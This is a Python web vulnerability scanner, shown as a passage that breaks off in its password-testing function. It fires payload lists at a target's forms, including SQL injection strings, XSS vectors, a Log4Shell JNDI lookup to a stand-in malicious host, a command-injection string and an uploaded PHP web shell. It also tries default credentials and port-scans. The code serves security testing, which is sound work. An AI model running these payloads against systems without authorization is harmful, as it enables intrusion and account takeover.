#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Comprehensive Security Testing Framework
A comprehensive tool for conducting various security tests including:
- Input validation
- Authentication testing
- SQL injection detection
- XSS vulnerability scanning
- CSRF protection verification
- Password security analysis
- Session management testing
- Network scanning
- File upload testing
- API security testing
"""

import re
import hashlib
import secrets
import urllib.parse
import socket
import ssl
import requests
import json
import time
import os
import subprocess
import logging
import argparse
from typing import Dict, List, Tuple, Any, Optional, Union
from dataclasses import dataclass
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security_test.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('SecurityTester')


class VulnerabilityLevel(Enum):
    """Enumeration for vulnerability severity levels."""
    CRITICAL = 5
    HIGH = 4
    MEDIUM = 3
    LOW = 2
    INFO = 1


@dataclass
class Vulnerability:
    """Class to represent a detected vulnerability."""
    name: str
    description: str
    level: VulnerabilityLevel
    location: str
    details: Dict[str, Any]
    remediation: str
    

class SecurityTester:
    """Main security testing framework class."""
    
    def __init__(self, target: str, output_file: str = "security_report.json"):
        """
        Initialize the security tester.
        
        Args:
            target: URL or IP address of the target system
            output_file: Path to the output file for the security report
        """
        self.target = target
        self.output_file = output_file
        self.vulnerabilities: List[Vulnerability] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecurityTester/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        
        # Parse the target URL
        parsed_url = urlparse(target)
        self.base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        self.hostname = parsed_url.netloc
        
        logger.info(f"Security tester initialized for target: {self.target}")
    
    def run_all_tests(self) -> None:
        """Run all security tests on the target."""
        logger.info("Starting comprehensive security test suite")
        
        # Input validation tests
        self.test_input_validation()
        
        # Authentication and authorization tests
        self.test_authentication()
        self.test_authorization()
        
        # Injection tests
        self.test_sql_injection()
        self.test_xss_vulnerabilities()
        self.test_csrf_protection()
        
        # Session management tests
        self.test_session_management()
        
        # Network security tests
        self.test_ssl_tls_configuration()
        self.test_open_ports()
        
        # File upload tests
        self.test_file_upload_security()
        
        # API security tests
        self.test_api_security()
        
        # Password security tests
        self.test_password_security()
        
        # Error handling and information disclosure
        self.test_error_handling()
        
        # Generate the final report
        self.generate_report()
        
        logger.info("Security testing completed")

    def test_input_validation(self) -> None:
        """Test for input validation vulnerabilities."""
        logger.info("Testing input validation")
        
        test_payloads = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "1 OR 1=1",
            "%00../../etc/passwd",
            "admin' --",
            "${jndi:ldap://malicious-server.com/payload}",
            "{{7*7}}",  # Template injection
            "|ls -la",  # Command injection
            "%0d%0aSet-Cookie: malicious=true"  # HTTP header injection
        ]
        
        # Get all forms from the target website
        forms = self._get_forms()
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.target
            elif form_action.startswith('/'):
                form_action = urljoin(self.base_url, form_action)
            
            form_method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            
            for payload in test_payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        data[input_name] = payload
                
                try:
                    if form_method == 'post':
                        response = self.session.post(form_action, data=data, allow_redirects=True, timeout=10)
                    else:
                        response = self.session.get(form_action, params=data, allow_redirects=True, timeout=10)
                    
                    # Check if the payload is reflected in the response
                    if payload in response.text:
                        self.vulnerabilities.append(Vulnerability(
                            name="Input Validation Vulnerability",
                            description=f"Input is reflected without proper validation or encoding",
                            level=VulnerabilityLevel.HIGH,
                            location=form_action,
                            details={
                                "payload": payload,
                                "form_method": form_method,
                                "form_data": data
                            },
                            remediation="Implement proper input validation and output encoding."
                        ))
                        logger.warning(f"Input validation vulnerability found at {form_action}")
                
                except Exception as e:
                    logger.error(f"Error testing input validation: {str(e)}")

    def test_authentication(self) -> None:
        """Test for authentication vulnerabilities."""
        logger.info("Testing authentication mechanisms")
        
        # Test for default credentials
        default_credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "administrator", "password": "administrator"},
            {"username": "root", "password": "root"},
            {"username": "user", "password": "user"}
        ]
        
        # Find login forms
        login_forms = self._find_login_forms()
        
        for form in login_forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.target
            elif form_action.startswith('/'):
                form_action = urljoin(self.base_url, form_action)
            
            form_method = form.get('method', 'post').lower()
            
            # Test for default credentials
            for creds in default_credentials:
                try:
                    inputs = form.find_all('input')
                    data = {}
                    
                    username_field = None
                    password_field = None
                    
                    # Identify username and password fields
                    for input_field in inputs:
                        input_type = input_field.get('type', '')
                        input_name = input_field.get('name', '')
                        input_id = input_field.get('id', '')
                        
                        if input_type == 'password':
                            password_field = input_name
                            data[input_name] = creds["password"]
                        elif 'user' in input_name.lower() or 'login' in input_name.lower() or 'email' in input_name.lower():
                            username_field = input_name
                            data[input_name] = creds["username"]
                        elif input_type not in ('submit', 'button', 'reset', 'hidden'):
                            data[input_name] = ""
                    
                    if username_field and password_field:
                        if form_method == 'post':
                            response = self.session.post(form_action, data=data, allow_redirects=True, timeout=10)
                        else:
                            response = self.session.get(form_action, params=data, allow_redirects=True, timeout=10)
                        
                        # Check if login was successful (this is a heuristic and might need adjustment)
                        if 'logout' in response.text.lower() or 'welcome' in response.text.lower() or 'dashboard' in response.text.lower():
                            self.vulnerabilities.append(Vulnerability(
                                name="Default Credentials Vulnerability",
                                description=f"System accepts default or weak credentials",
                                level=VulnerabilityLevel.CRITICAL,
                                location=form_action,
                                details={
                                    "username": creds["username"],
                                    "password": creds["password"]
                                },
                                remediation="Change default credentials and implement strong password policies."
                            ))
                            logger.critical(f"Default credentials vulnerability found at {form_action}")
                
                except Exception as e:
                    logger.error(f"Error testing authentication: {str(e)}")
        
        # Test for brute force protection
        self._test_brute_force_protection(login_forms)
    
    def _test_brute_force_protection(self, login_forms: List[Any]) -> None:
        """Test if the application has protection against brute force attacks."""
        if not login_forms:
            return
        
        form = login_forms[0]
        form_action = form.get('action', '')
        if not form_action:
            form_action = self.target
        elif form_action.startswith('/'):
            form_action = urljoin(self.base_url, form_action)
        
        form_method = form.get('method', 'post').lower()
        
        inputs = form.find_all('input')
        data = {}
        
        username_field = None
        password_field = None
        
        # Identify username and password fields
        for input_field in inputs:
            input_type = input_field.get('type', '')
            input_name = input_field.get('name', '')
            
            if input_type == 'password':
                password_field = input_name
                data[input_name] = "wrong_password"
            elif 'user' in input_name.lower() or 'login' in input_name.lower() or 'email' in input_name.lower():
                username_field = input_name
                data[input_name] = "test_user"
            elif input_type not in ('submit', 'button', 'reset', 'hidden'):
                data[input_name] = ""
        
        if username_field and password_field:
            # Try multiple failed login attempts
            blocked = False
            try:
                for _ in range(10):
                    if form_method == 'post':
                        response = self.session.post(form_action, data=data, allow_redirects=True, timeout=10)
                    else:
                        response = self.session.get(form_action, params=data, allow_redirects=True, timeout=10)
                    
                    # Check if we've been blocked or rate-limited
                    if response.status_code == 429 or 'too many' in response.text.lower() or 'blocked' in response.text.lower():
                        blocked = True
                        break
                    
                    time.sleep(1)  # Small delay between requests
                
                if not blocked:
                    self.vulnerabilities.append(Vulnerability(
                        name="Missing Brute Force Protection",
                        description="The application does not appear to have adequate protection against brute force attacks",
                        level=VulnerabilityLevel.HIGH,
                        location=form_action,
                        details={"attempts": 10},
                        remediation="Implement account lockout or rate limiting after a number of failed login attempts."
                    ))
                    logger.warning(f"Missing brute force protection at {form_action}")
            
            except Exception as e:
                logger.error(f"Error testing brute force protection: {str(e)}")

    def test_authorization(self) -> None:
        """Test for authorization vulnerabilities."""
        logger.info("Testing authorization controls")
        
        # Test for IDOR (Insecure Direct Object References)
        self._test_idor()
        
        # Test for privilege escalation
        self._test_privilege_escalation()
    
    def _test_idor(self) -> None:
        """Test for Insecure Direct Object References (IDOR)."""
        # Find all links that might contain user IDs or resource IDs
        links = self._get_all_links()
        
        potential_idor_patterns = [
            r'id=\d+',
            r'user=\d+',
            r'account=\d+',
            r'profile=\d+',
            r'file=\d+',
            r'document=\d+',
            r'resource=\d+'
        ]
        
        idor_candidates = []
        
        for link in links:
            for pattern in potential_idor_patterns:
                if re.search(pattern, link):
                    idor_candidates.append(link)
                    break
        
        # Test IDOR candidates
        for candidate in idor_candidates:
            try:
                # First request to get original response
                original_response = self.session.get(candidate, timeout=10)
                
                # Extract the ID from the URL
                match = None
                for pattern in potential_idor_patterns:
                    match = re.search(pattern, candidate)
                    if match:
                        break
                
                if match:
                    id_part = match.group(0)
                    id_value = re.search(r'\d+', id_part).group(0)
                    
                    # Modify the ID
                    modified_id = str(int(id_value) + 1)
                    modified_url = candidate.replace(id_part, id_part.replace(id_value, modified_id))
                    
                    # Send request with modified ID
                    modified_response = self.session.get(modified_url, timeout=10)
                    
                    # If both responses are successful and similar, might be an IDOR vulnerability
                    if (original_response.status_code == 200 and modified_response.status_code == 200 and
                            len(modified_response.text) > 100 and  # Ensure it's not just an error page
                            self._response_similarity(original_response.text, modified_response.text) > 0.7):
                        
                        self.vulnerabilities.append(Vulnerability(
                            name="Potential IDOR Vulnerability",
                            description="The application may allow access to resources via direct object references",
                            level=VulnerabilityLevel.HIGH,
                            location=candidate,
                            details={
                                "original_url": candidate,
                                "modified_url": modified_url
                            },
                            remediation="Implement proper authorization checks and use indirect object references."
                        ))
                        logger.warning(f"Potential IDOR vulnerability found: {candidate} -> {modified_url}")
            
            except Exception as e:
                logger.error(f"Error testing IDOR for {candidate}: {str(e)}")
    
    def _test_privilege_escalation(self) -> None:
        """Test for privilege escalation vulnerabilities."""
        # This is a simplified version of privilege escalation testing
        # In a real scenario, we would need actual credentials and identified admin/privileged endpoints
        
        # Find admin or privileged area links
        links = self._get_all_links()
        
        privileged_patterns = [
            r'admin',
            r'settings',
            r'config',
            r'dashboard',
            r'manage',
            r'control'
        ]
        
        privileged_candidates = []
        
        for link in links:
            for pattern in privileged_patterns:
                if re.search(pattern, link, re.IGNORECASE):
                    privileged_candidates.append(link)
                    break
        
        # Try to access privileged areas
        for candidate in privileged_candidates:
            try:
                response = self.session.get(candidate, timeout=10)
                
                # If we can access without authentication, it's a vulnerability
                if response.status_code == 200 and 'login' not in response.url.lower():
                    self.vulnerabilities.append(Vulnerability(
                        name="Potential Privilege Escalation",
                        description="Access to privileged area without proper authentication",
                        level=VulnerabilityLevel.CRITICAL,
                        location=candidate,
                        details={"status_code": response.status_code},
                        remediation="Implement proper access controls for privileged functionalities."
                    ))
                    logger.critical(f"Potential privilege escalation found: {candidate}")
            
            except Exception as e:
                logger.error(f"Error testing privilege escalation for {candidate}: {str(e)}")

    def test_sql_injection(self) -> None:
        """Test for SQL injection vulnerabilities."""
        logger.info("Testing for SQL injection vulnerabilities")
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "') OR ('1'='1",
            "1' OR '1'='1",
            "1 OR 1=1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR 1=1--",
            "') OR 1=1#",
            "') OR 1=1/*",
            "1') OR ('1'='1",
            "1' OR '1'='1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' OR sleep(5)--",  # Time-based injection
            "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --"  # Boolean-based injection
        ]
        
        # Get all forms from the target website
        forms = self._get_forms()
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.target
            elif form_action.startswith('/'):
                form_action = urljoin(self.base_url, form_action)
            
            form_method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            
            for payload in sql_payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        data[input_name] = payload
                
                try:
                    start_time = time.time()
                    
                    if form_method == 'post':
                        response = self.session.post(form_action, data=data, allow_redirects=True, timeout=15)
                    else:
                        response = self.session.get(form_action, params=data, allow_redirects=True, timeout=15)
                    
                    response_time = time.time() - start_time
                    
                    # Check for SQL error messages
                    sql_errors = [
                        "SQL syntax",
                        "mysql_fetch",
                        "ORA-",
                        "Oracle error",
                        "PostgreSQL",
                        "SQLite",
                        "SQL Server",
                        "syntax error",
                        "ODBC Driver",
                        "DB2 Error",
                        "Microsoft Access",
                        "SQLite3",
                        "PG::",
                        "Warning: mysql",
                        "unclosed quotation mark",
                        "Division by zero",
                        "supplied argument is not a valid MySQL",
                        "mysqli_fetch_assoc()",
                        "pg_query() [function.pg-query]:",
                        "CLI Driver"
                    ]
                    
                    is_vulnerable = False
                    error_detected = ""
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            is_vulnerable = True
                            error_detected = error
                            break
                    
                    # Check for time-based injections
                    if "sleep" in payload.lower() and response_time > 5:
                        is_vulnerable = True
                        error_detected = "Time-based injection"
                    
                    if is_vulnerable:
                        self.vulnerabilities.append(Vulnerability(
                            name="SQL Injection Vulnerability",
                            description=f"SQL injection vulnerability detected",
                            level=VulnerabilityLevel.CRITICAL,
                            location=form_action,
                            details={
                                "payload": payload,
                                "error": error_detected,
                                "form_method": form_method,
                                "form_data": data
                            },
                            remediation="Use parameterized queries or prepared statements. Implement proper input validation and use an ORM."
                        ))
                        logger.critical(f"SQL injection vulnerability found at {form_action}")
                
                except Exception as e:
                    logger.error(f"Error testing SQL injection: {str(e)}")

    def test_xss_vulnerabilities(self) -> None:
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        logger.info("Testing for XSS vulnerabilities")
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "\"><script>alert('XSS')</script>",
            "';alert('XSS')//",
            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
            "<input type=\"text\" value=\"\" autofocus onfocus=\"alert('XSS')\">"
        ]
        
        # Get all forms from the target website
        forms = self._get_forms()
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.target
            elif form_action.startswith('/'):
                form_action = urljoin(self.base_url, form_action)
            
            form_method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            
            for payload in xss_payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        data[input_name] = payload
                
                try:
                    if form_method == 'post':
                        response = self.session.post(form_action, data=data, allow_redirects=True, timeout=10)
                    else:
                        response = self.session.get(form_action, params=data, allow_redirects=True, timeout=10)
                    
                    # Check if the payload is reflected in the response
                    if payload in response.text:
                        self.vulnerabilities.append(Vulnerability(
                            name="Cross-Site Scripting (XSS) Vulnerability",
                            description=f"XSS vulnerability detected with payload reflection",
                            level=VulnerabilityLevel.HIGH,
                            location=form_action,
                            details={
                                "payload": payload,
                                "form_method": form_method,
                                "form_data": data
                            },
                            remediation="Implement proper output encoding. Use Content-Security-Policy headers. Validate and sanitize all user inputs."
                        ))
                        logger.warning(f"XSS vulnerability found at {form_action}")
                
                except Exception as e:
                    logger.error(f"Error testing XSS: {str(e)}")

    def test_csrf_protection(self) -> None:
        """Test for Cross-Site Request Forgery (CSRF) protection."""
        logger.info("Testing for CSRF protection")
        
        # Get all forms from the target website
        forms = self._get_forms()
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.target
            elif form_action.startswith('/'):
                form_action = urljoin(self.base_url, form_action)
            
            form_method = form.get('method', 'get').lower()
            
            # Skip GET forms as they are less relevant for CSRF
            if form_method == 'get':
                continue
            
            # Check for CSRF tokens
            inputs = form.find_all('input')
            has_csrf_token = False
            
            for input_field in inputs:
                input_name = input_field.get('name', '').lower()
                input_value = input_field.get('value', '')
                
                if ('csrf' in input_name or 
                    'token' in input_name or 
                    'nonce' in input_name or 
                    '_token' in input_name):
                    has_csrf_token = True
                    break
            
            if not has_csrf_token:
                # Check if cookies contain CSRF tokens
                csrf_in_cookie = False
                for cookie_name in self.session.cookies.keys():
                    if 'csrf' in cookie_name.lower() or 'token' in cookie_name.lower() or 'xsrf' in cookie_name.lower():
                        csrf_in_cookie = True
                        break
                
                if not csrf_in_cookie:
                    # Also check headers from a response
                    try:
                        response = self.session.get(form_action, timeout=10)
                        
                        # Check for security headers
                        csrf_in_header = False
                        for header, value in response.headers.items():
                            if header.lower() in ['x-csrf-token', 'x-xsrf-token']:
                                csrf_in_header = True
                                break
                        
                        if not csrf_in_header:
                            self.vulnerabilities.append(Vulnerability(
                                name="Missing CSRF Protection",
                                description="Form does not implement CSRF protection",
                                level=VulnerabilityLevel.MEDIUM,
                                location=form_action,
                                details={"form_method": form_method},
                                remediation="Implement CSRF tokens in forms. Use the SameSite cookie attribute. Verify the origin header."
                            ))
                            logger.warning(f"Missing CSRF protection found at {form_action}")
                    
                    except Exception as e:
                        logger.error(f"Error testing CSRF protection: {str(e)}")

    def test_session_management(self) -> None:
        """Test for session management issues."""
        logger.info("Testing session management")
        
        try:
            # Get initial cookies
            response = self.session.get(self.target, timeout=10)
            
            # Analyze cookies
            for cookie in self.session.cookies:
                # Check if cookies have secure flag
                if not cookie.secure and 'https' in self.target:
                    self.vulnerabilities.append(Vulnerability(
                        name="Insecure Cookie",
                        description="Cookie missing Secure flag",
                        level=VulnerabilityLevel.MEDIUM,
                        location=self.target,
                        details={"cookie_name": cookie.name},
                        remediation="Set the Secure flag on all cookies to ensure they are only sent over HTTPS."
                    ))
                    logger.warning(f"Insecure cookie found: {cookie.name}")
                
                # Check if cookies have httpOnly flag
                if not cookie.has_nonstandard_attr('httpOnly') and not cookie.has_nonstandard_attr('HttpOnly'):
                    self.vulnerabilities.append(Vulnerability(
                        name="HttpOnly Flag Missing",
                        description="Cookie missing HttpOnly flag",
                        level=VulnerabilityLevel.MEDIUM,
                        location=self.target,
                        details={"cookie_name": cookie.name},
                        remediation="Set the HttpOnly flag on all cookies to prevent client-side script access."
                    ))
                    logger.warning(f"HttpOnly flag missing for cookie: {cookie.name}")
                
                # Check if cookies have SameSite attribute
                if not cookie.has_nonstandard_attr('SameSite') and not cookie.has_nonstandard_attr('samesite'):
                    self.vulnerabilities.append(Vulnerability(
                        name="SameSite Attribute Missing",
                        description="Cookie missing SameSite attribute",
                        level=VulnerabilityLevel.LOW,
                        location=self.target,
                        details={"cookie_name": cookie.name},
                        remediation="Set the SameSite attribute on cookies to restrict cross-site requests."
                    ))
                    logger.info(f"SameSite attribute missing for cookie: {cookie.name}")
                
                # Check for session fixation
                # This would require more complex testing, such as checking if the session ID changes after login
                
        except Exception as e:
            logger.error(f"Error testing session management: {str(e)}")

    def test_ssl_tls_configuration(self) -> None:
        """Test SSL/TLS configuration for vulnerabilities."""
        logger.info("Testing SSL/TLS configuration")
        
        if not self.target.startswith('https://'):
            self.vulnerabilities.append(Vulnerability(
                name="No HTTPS",
                description="The site is not using HTTPS",
                level=VulnerabilityLevel.HIGH,
                location=self.target,
                details={},
                remediation="Implement HTTPS across the entire site. Redirect HTTP to HTTPS."
            ))
            logger.warning(f"Site is not using HTTPS: {self.target}")
            return
        
        try:
            parsed_url = urlparse(self.target)
            hostname = parsed_url.netloc
            port = parsed_url.port or 443
            
            # Test for SSLv2, SSLv3, TLSv1.0, TLSv1.1
            insecure_protocols = []
            
            for protocol in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                context = None
                try:
                    if protocol == 'SSLv2':
                        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                        context.options &= ~ssl.OP_NO_SSLv2
                    elif protocol == 'SSLv3':
                        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                        context.options &= ~ssl.OP_NO_SSLv3
                    elif protocol == 'TLSv1':
                        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                        context.options &= ~ssl.OP_NO_TLSv1
                    elif protocol == 'TLSv1.1':
                        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                        context.options &= ~ssl.OP_NO_TLSv1_1
                    
                    with socket.create_connection((hostname, port)) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                            server_protocol = ssock.version()
                            if protocol in server_protocol:
                                insecure_protocols.append(protocol)
                
                except (ssl.SSLError, socket.error, ConnectionRefusedError):
                    # This is good - it means the protocol is not supported
                    pass
            
            for protocol in insecure_protocols:
                self.vulnerabilities.append(Vulnerability(
                    name=f"Insecure {protocol} Supported",
                    description=f"The server supports the insecure {protocol} protocol",
                    level=VulnerabilityLevel.HIGH,
                    location=self.target,
                    details={"protocol": protocol},
                    remediation=f"Disable support for {protocol} on the server."
                ))
                logger.warning(f"Insecure protocol supported: {protocol}")
            
            # Test for weak ciphers
            # This would require more complex tools like OpenSSL for a thorough check
            
        except Exception as e:
            logger.error(f"Error testing SSL/TLS configuration: {str(e)}")

    def test_open_ports(self) -> None:
        """Perform a basic port scan to find open ports."""
        logger.info("Testing for open ports")
        
        try:
            parsed_url = urlparse(self.target)
            hostname = parsed_url.netloc.split(':')[0]  # Remove port if present
            
            common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
            open_ports = []
            
            for port in common_ports:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        result = s.connect_ex((hostname, port))
                        if result == 0:
                            open_ports.append(port)
                except:
                    pass
            
            # Check for sensitive open ports
            sensitive_ports = {
                21: "FTP",
                22: "SSH",
                23: "Telnet",
                25: "SMTP",
                1433: "MSSQL",
                1521: "Oracle",
                3306: "MySQL",
                3389: "RDP",
                5432: "PostgreSQL"
            }
            
            for port in open_ports:
                if port in sensitive_ports:
                    self.vulnerabilities.append(Vulnerability(
                        name=f"Open {sensitive_ports[port]} Port",
                        description=f"Sensitive port {port} ({sensitive_ports[port]}) is open",
                        level=VulnerabilityLevel.MEDIUM,
                        location=f"{hostname}:{port}",
                        details={"service": sensitive_ports[port]},
                        remediation=f"Restrict access to the {sensitive_ports[port]} service using a firewall."
                    ))
                    logger.warning(f"Open sensitive port found: {port} ({sensitive_ports[port]})")
            
            logger.info(f"Open ports: {open_ports}")
            
        except Exception as e:
            logger.error(f"Error testing open ports: {str(e)}")

    def test_file_upload_security(self) -> None:
        """Test for secure file upload implementation."""
        logger.info("Testing file upload security")
        
        # Find file upload forms
        forms = self._get_forms()
        
        file_upload_forms = []
        for form in forms:
            inputs = form.find_all('input')
            for input_field in inputs:
                if input_field.get('type') == 'file':
                    file_upload_forms.append(form)
                    break
        
        # Prepare malicious test files
        test_files = [
            {
                "name": "test.php",
                "content": "<?php echo 'Test PHP Execution'; ?>",
                "type": "application/x-php"
            },
            {
                "name": "test.html",
                "content": "<script>alert('XSS')</script>",
                "type": "text/html"
            },
            {
                "name": "test.jpg.php",
                "content": "<?php system($_GET['cmd']); ?>",
                "type": "application/x-php"
            },
            {
                "name": "large_file.txt",
                "content": "A" * 1024 * 1024 * 10,  # 10MB file
                "type": "text/plain"
            }
        ]
        
        for form in file_upload_forms:
            form_action = form.get('action', '')
            if not form_action:
                form_action = self.target
            elif form_action.startswith('/'):
                form_action = urljoin(self.base_url, form_action)
            
            inputs = form.find_all('input')
            
            for test_file in test_files:
                try:
                    # Create a temporary file
                    temp_file_path = f"/tmp/{test_file['name']}"
                    with open(temp_file_path, 'w') as f:
                        f.write(test_file['content'])
                    
                    # Prepare the file upload
                    files = {}
                    data = {}
                    
                    for input_field in inputs:
                        input_type = input_field.get('type', '')
                        input_name = input_field.get('name', '')
                        
                        if input_type == 'file':
                            files[input_name] = (
                                test_file['name'],
                                open(temp_file_path, 'rb'),
                                test_file['type']
                            )
                        elif input_name and input_type not in ('submit', 'button', 'reset'):
                            data[input_name] = "test"
                    
                    # Submit the form with the file
                    response = self.session.post(
                        form_action,
                        files=files,
                        data=data,
                        allow_redirects=True,
                        timeout=30
                    )
                    
                    # Check if the upload was successful
                    if response.status_code == 200 and 'success' in response.text.lower():
                        # This is a simplistic check and would need to be refined in a real implementation
                        if test_file['name'].endswith('.php') or test_file['name'].endswith('.html'):
                            self.vulnerabilities.append(Vulnerability(
                                name="Insecure File Upload",
                                description=f"The application allows uploading of potentially dangerous file types",
                                level=VulnerabilityLevel.HIGH,
                                location=form_action,
                                details={"filename": test_file['name']},
                                remediation="Implement strict file type validation. Use a whitelist of allowed extensions. Scan uploaded files for malicious content."
                            ))
                            logger.warning(f"Insecure file upload found at {form_action} for file {test_file['name']}")
                    
                    # Clean up
                    for key in files:
                        files[key][1].close()
                    os.remove(temp_file_path)
                
                except Exception as e:
                    logger.error(f"Error testing file upload security: {str(e)}")
                    # Clean up on error
                    try:
                        os.remove(temp_file_path)
                    except:
                        pass

    def test_api_security(self) -> None:
        """Test the security of APIs."""
        logger.info("Testing API security")
        
        # Look for potential API endpoints
        links = self._get_all_links()
        
        api_patterns = [
            r'/api/',
            r'/rest/',
            r'/graphql',
            r'/v\d+/',
            r'\.json$',
            r'\.xml$'
        ]
        
        api_endpoints = []
        
        for link in links:
            for pattern in api_patterns:
                if re.search(pattern, link):
                    api_endpoints.append(link)
                    break
        
        # Test discovered API endpoints
        for endpoint in api_endpoints:
            # Test for lack of rate limiting
            self._test_api_rate_limiting(endpoint)
            
            # Test for insecure HTTP methods
            self._test_api_http_methods(endpoint)
            
            # Test for missing authentication
            self._test_api_missing_auth(endpoint)
    
    def _test_api_rate_limiting(self, endpoint: str) -> None:
        """Test if the API implements rate limiting."""
        try:
            # Send multiple requests in quick succession
            request_count = 20
            responses = []
            
            for _ in range(request_count):
                response = self.session.get(endpoint, timeout=5)
                responses.append(response)
            
            # Check if we received rate limiting headers or status codes
            rate_limited = False
            
            for response in responses:
                if (response.status_code == 429 or 
                    'rate-limit' in response.headers or 
                    'retry-after' in response.headers or
                    'x-rate-limit' in response.headers):
                    rate_limited = True
                    break
            
            if not rate_limited:
                self.vulnerabilities.append(Vulnerability(
                    name="Missing API Rate Limiting",
                    description="The API endpoint does not appear to implement rate limiting",
                    level=VulnerabilityLevel.MEDIUM,
                    location=endpoint,
                    details={"requests_sent": request_count},
                    remediation="Implement rate limiting for API endpoints to prevent abuse and DoS attacks."
                ))
                logger.warning(f"Missing API rate limiting at {endpoint}")
        
        except Exception as e:
            logger.error(f"Error testing API rate limiting: {str(e)}")
    
    def _test_api_http_methods(self, endpoint: str) -> None:
        """Test if the API allows insecure HTTP methods."""
        try:
            http_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE']
            
            allowed_methods = []
            
            for method in http_methods:
                try:
                    response = self.session.request(method, endpoint, timeout=5)
                    
                    # If the response is not a 405 Method Not Allowed, the method might be supported
                    if response.status_code != 405:
                        allowed_methods.append(method)
                except:
                    pass
            
            # Check for potentially dangerous methods
            dangerous_methods = set(['PUT', 'DELETE', 'PATCH', 'TRACE'])
            allowed_dangerous = dangerous_methods.intersection(set(allowed_methods))
            
            if allowed_dangerous:
                self.vulnerabilities.append(Vulnerability(
                    name="Insecure HTTP Methods Allowed",
                    description="The API endpoint allows potentially dangerous HTTP methods",
                    level=VulnerabilityLevel.MEDIUM,
                    location=endpoint,
                    details={"allowed_methods": list(allowed_dangerous)},
                    remediation="Restrict HTTP methods to only those necessary for the API's functionality."
                ))
                logger.warning(f"Insecure HTTP methods allowed at {endpoint}: {allowed_dangerous}")
            
            # Check if OPTIONS method reveals too much information
            if 'OPTIONS' in allowed_methods:
                options_response = self.session.options(endpoint, timeout=5)
                if 'Allow' in options_response.headers:
                    self.vulnerabilities.append(Vulnerability(
                        name="Excessive Information Disclosure",
                        description="The OPTIONS method reveals all supported HTTP methods",
                        level=VulnerabilityLevel.LOW,
                        location=endpoint,
                        details={"allow_header": options_response.headers['Allow']},
                        remediation="Configure the server to provide minimal information in response to OPTIONS requests."
                    ))
                    logger.info(f"Excessive information disclosure at {endpoint}: {options_response.headers['Allow']}")
        
        except Exception as e:
            logger.error(f"Error testing API HTTP methods: {str(e)}")
    
    def _test_api_missing_auth(self, endpoint: str) -> None:
        """Test if the API requires authentication."""
        try:
            # Clear session cookies to simulate an unauthenticated request
            original_cookies = self.session.cookies.copy()
            self.session.cookies.clear()
            
            response = self.session.get(endpoint, timeout=5)
            
            # Restore original cookies
            self.session.cookies = original_cookies
            
            # Check if the response contains data (not an error page or login redirect)
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                
                # Check if it's a JSON or XML response and not too small to be an error
                if (('application/json' in content_type or 'application/xml' in content_type) and 
                        len(response.text) > 50):
                    self.vulnerabilities.append(Vulnerability(
                        name="API Missing Authentication",
                        description="The API endpoint provides data without requiring authentication",
                        level=VulnerabilityLevel.HIGH,
                        location=endpoint,
                        details={},
                        remediation="Implement proper authentication for all API endpoints that serve non-public data."
                    ))
                    logger.warning(f"API missing authentication at {endpoint}")
        
        except Exception as e:
            logger.error(f"Error testing API authentication: {str(e)}")

    def test_password_security(self) -> None:
        """Test for password security issues."""
        logger.info("Testing password security")
        
        # Find registration forms or forms with password fields
        forms = self._get_forms()
        
        password_forms = []
        for form in forms:
            inputs = form.find_all('input')
            has_password = False
            
            for input_field in inputs:
                if input_field.get('type') == 'password':
                    has_password = True
                    break
            
            if has_password:
                password_forms.append(form)
        
        # Test forms with password fields
        for form in password_forms:
